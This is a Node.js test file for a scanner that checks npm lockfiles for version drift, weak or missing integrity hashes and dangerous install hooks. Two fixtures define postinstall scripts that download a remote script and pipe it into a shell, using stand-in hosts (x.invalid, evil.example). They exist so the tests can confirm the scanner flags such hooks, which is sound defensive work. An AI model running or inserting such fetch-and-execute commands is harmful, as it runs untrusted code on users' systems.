// M5a: bin/deps-content.mjs — local dependency-content checks beyond advisory (version drift,
// integrity hygiene). Fixtures are built at test time; no network.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCANNER = join(dirname(fileURLToPath(import.meta.url)), '..', 'deps-content.mjs');
function scan(root, env = {}) { return JSON.parse(execFileSync('node', [SCANNER, root], { env: { ...process.env, ...env } }).toString()); }
// The exit code and the stdout together — an exit-2 run still emits its JSON so the void is stated twice.
function scanRaw(root, env = {}) {
  const r = spawnSync('node', [SCANNER, root], { env: { ...process.env, ...env }, encoding: 'utf8' });
  return { status: r.status, report: r.stdout.trim() ? JSON.parse(r.stdout) : null };
}
function tmp() { return mkdtempSync(join(tmpdir(), 'deps-test-')); }
function writePkg(root, key, version) { const p = join(root, key, 'package.json'); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, JSON.stringify({ name: key.split('/').pop(), version })); }

test('no lockfile → a declared void, not a clean zero: exit 0, filesScanned 0', () => {
  const d = tmp();
  const { status, report: r } = scanRaw(d);
  assert.equal(status, 0, 'absent is legitimate, so the lane RAN');
  assert.equal(r.summary.noLockfile, true);
  assert.equal(r.summary.findings, 0);
  assert.equal(r.summary.filesScanned, 0, 'nothing was examined, and the rule-counts reader treats 0 as a void');
  rmSync(d, { recursive: true, force: true });
});

test('an unparseable lockfile is a could-not-run: exit 2 AND a stated summary flag', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), '{ this is not json');
  const { status, report: r } = scanRaw(d);
  assert.equal(status, 2, 'a parse failure is never an empty result — the manifest wrapper must record a could-not-run');
  assert.equal(r.summary.unparseable, true);
  assert.match(r.summary.couldNotRun, /not JSON/);
  assert.equal(r.summary.filesScanned, 0);
  assert.deepEqual(r.findings, []);
  rmSync(d, { recursive: true, force: true });
});

test('a lockfile that exists but cannot be read is exit 2, not an absent-lockfile void', () => {
  const d = tmp();
  mkdirSync(join(d, 'package-lock.json'));   // EISDIR: present, unreadable, and not ENOENT
  const { status, report: r } = scanRaw(d);
  assert.equal(status, 2);
  assert.equal(r.summary.noLockfile, undefined, 'only ENOENT means legitimately absent');
  assert.equal(r.summary.unparseable, true);
  rmSync(d, { recursive: true, force: true });
});

test('filesScanned counts the packages examined plus the lockfile itself', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { name: 'root' },
      'node_modules/a': { version: '1.0.0', resolved: 'https://r/a.tgz', integrity: 'sha512-A' },
      'node_modules/b': { version: '1.0.0', resolved: 'https://r/b.tgz', integrity: 'sha512-B' },
      'node_modules/c': { version: '1.0.0', resolved: 'https://r/c.tgz', integrity: 'sha512-C' },
    },
  }));
  const r = scan(d);
  assert.equal(r.summary.packagesChecked, 3);
  assert.equal(r.summary.filesScanned, 4);
  assert.equal(r.summary.findings, 0, 'and a clean examined tree is 0 findings over a non-zero filesScanned');
  rmSync(d, { recursive: true, force: true });
});

test('every finding carries a sev in {crit,high,med,low} and a CWE from RULE_CWE', async () => {
  const { RULE_CWE, RULE_SEV } = await import(SCANNER);
  assert.deepEqual(RULE_CWE, {
    'dep-install-exec': 'CWE-829', 'dep-install-script': 'CWE-829',
    'dep-missing-integrity': 'CWE-494', 'dep-weak-integrity': 'CWE-494',
    'dep-version-drift': 'CWE-1357',
  });
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': {},
      'node_modules/nohash': { version: '1.0.0', resolved: 'https://r/nohash.tgz' },
      'node_modules/oldhash': { version: '1.0.0', resolved: 'https://r/oldhash.tgz', integrity: 'sha1-abc' },
      'node_modules/drift': { version: '1.0.0', resolved: 'https://r/drift.tgz', integrity: 'sha512-D' },
      'node_modules/hook': { version: '1.0.0', resolved: 'https://r/hook.tgz', integrity: 'sha512-H', hasInstallScript: true },
    },
  }));
  writePkg(d, 'node_modules/drift', '2.0.0');
  writePkgFull(d, 'node_modules/hook', { name: 'hook', version: '1.0.0', scripts: { postinstall: 'wget -qO- https://x.invalid/s | bash' } });
  const r = scan(d);
  assert.deepEqual(Object.keys(r.summary.byRule).sort(), ['dep-install-exec', 'dep-missing-integrity', 'dep-version-drift', 'dep-weak-integrity']);
  for (const f of r.findings) {
    assert.ok(['crit', 'high', 'med', 'low'].includes(f.sev), `${f.rule} sev=${f.sev}`);
    assert.equal(f.sev, RULE_SEV[f.rule]);
    assert.equal(f.cwe, RULE_CWE[f.rule], `${f.rule} must carry its declared CWE`);
  }
  rmSync(d, { recursive: true, force: true });
});

test('dep-version-drift: installed version ≠ locked version fires high', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { name: 'root' },
      'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-AAA' },
    },
  }));
  writePkg(d, 'node_modules/left-pad', '9.9.9-tampered'); // installed differs from locked
  const r = scan(d);
  const f = r.findings.find((x) => x.rule === 'dep-version-drift');
  assert.ok(f, 'drift fires');
  assert.equal(f.sev, 'high');
  assert.match(f.detail, /9\.9\.9-tampered.*1\.3\.0/);
  rmSync(d, { recursive: true, force: true });
});

test('no drift when installed matches locked', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: { '': {}, 'node_modules/ok': { version: '2.0.0', resolved: 'https://registry.npmjs.org/ok/-/ok-2.0.0.tgz', integrity: 'sha512-BBB' } },
  }));
  writePkg(d, 'node_modules/ok', '2.0.0');
  const r = scan(d);
  assert.ok(!r.findings.some((x) => x.rule === 'dep-version-drift'));
  rmSync(d, { recursive: true, force: true });
});

test('dep-missing-integrity and dep-weak-integrity', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': {},
      'node_modules/nohash': { version: '1.0.0', resolved: 'https://registry.npmjs.org/nohash/-/nohash-1.0.0.tgz' },
      'node_modules/oldhash': { version: '1.0.0', resolved: 'https://registry.npmjs.org/oldhash/-/oldhash-1.0.0.tgz', integrity: 'sha1-abc' },
    },
  }));
  const r = scan(d);
  const rules = new Set(r.findings.map((f) => f.rule));
  assert.ok(rules.has('dep-missing-integrity'));
  assert.ok(rules.has('dep-weak-integrity'));
  rmSync(d, { recursive: true, force: true });
});

test('unsupported v1 lockfile is a could-not-run: exit 2 with the reason stated', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 1, dependencies: { foo: { version: '1.0.0' } } }));
  const { status, report: r } = scanRaw(d);
  assert.equal(status, 2, 'half-parsing a v1 lockfile would be a clean zero over packages never examined');
  assert.match(r.summary.unsupportedLockfile, /v2\/v3/);
  assert.match(r.summary.couldNotRun, /lockfileVersion 1/);
  assert.equal(r.summary.filesScanned, 0);
  rmSync(d, { recursive: true, force: true });
});

function writePkgFull(root, key, obj) { const p = join(root, key, 'package.json'); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, JSON.stringify(obj)); }

test('M5b: a dangerous install hook fires dep-install-exec (high); the command is not echoed', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: { '': {}, 'node_modules/sketchy': { version: '1.0.0', resolved: 'https://r/sketchy.tgz', integrity: 'sha512-Z', hasInstallScript: true } },
  }));
  writePkgFull(d, 'node_modules/sketchy', { name: 'sketchy', version: '1.0.0', scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } });
  const r = scan(d);
  const f = r.findings.find((x) => x.rule === 'dep-install-exec');
  assert.ok(f, 'dangerous install hook fires');
  assert.equal(f.sev, 'high');
  assert.ok(!JSON.stringify(r).includes('evil.example'), 'the raw command (with its URL) is not echoed');
  rmSync(d, { recursive: true, force: true });
});

test('M5b: a benign install hook does not fire dep-install-exec; audit mode lists it low', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: { '': {}, 'node_modules/nativemod': { version: '2.0.0', resolved: 'https://r/n.tgz', integrity: 'sha512-Y', hasInstallScript: true } },
  }));
  writePkgFull(d, 'node_modules/nativemod', { name: 'nativemod', version: '2.0.0', scripts: { install: 'node-gyp rebuild' } });
  const off = scan(d);
  assert.ok(!new Set(off.findings.map((x) => x.rule)).has('dep-install-exec'), 'node-gyp is not exfiltration');
  assert.ok(!new Set(off.findings.map((x) => x.rule)).has('dep-install-script'), 'benign hooks are audit-only (default-off)');
  const on = scan(d, { CW_DEPS_INSTALL_SCRIPTS: '1' });
  assert.ok(new Set(on.findings.map((x) => x.rule)).has('dep-install-script'), 'audit mode lists the install hook');
  rmSync(d, { recursive: true, force: true });
});

test('deterministic: two runs byte-identical', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { '': {}, 'node_modules/x': { version: '1.0.0', resolved: 'https://r/x.tgz' } } }));
  const a = execFileSync('node', [SCANNER, d]).toString();
  const b = execFileSync('node', [SCANNER, d]).toString();
  assert.equal(a, b);
  rmSync(d, { recursive: true, force: true });
});

test('a lockfile under .claude/worktrees/<name>/ is neither scanned nor named', () => {
  const d = tmp();
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
    '': { name: 'root' }, 'node_modules/a': { version: '1.0.0', resolved: 'https://r/a.tgz', integrity: 'sha512-A' } } }));
  const nested = join(d, '.claude', 'worktrees', 'agent-x');
  mkdirSync(nested, { recursive: true });
  writeFileSync(join(nested, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
    '': { name: 'root' }, 'node_modules/evil': { version: '1.0.0', resolved: 'https://r/evil.tgz' } } }));
  const r = scan(d);
  assert.equal(r.summary.filesScanned, 2);
  assert.equal(r.summary.findings, 0, JSON.stringify(r.findings));
  rmSync(d, { recursive: true, force: true });
});
